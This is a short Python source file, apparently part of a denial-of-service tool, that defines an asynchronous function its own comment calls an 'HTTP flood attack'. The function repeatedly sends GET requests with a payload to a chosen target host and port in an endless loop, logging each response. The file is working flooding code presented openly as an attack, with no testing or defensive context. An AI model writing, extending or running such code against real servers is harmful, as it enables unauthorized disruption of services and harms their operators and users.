import logging
import aiohttp
import socket
import time
import asyncio

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


# Asynchronous function to send HTTP flood attack
async def send_async_http_flood(target, port, payload, interval):
    url = f"http://{target}:{port}"
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(url, data=payload) as response:
                    logging.info(f"🌐 HTTP Flood Response: {response.status}")
            except Exception as e:
                logging.error(f"HTTP Flood Error: {e}")
                break  # Exit the loop on error
            await asyncio.sleep(interval)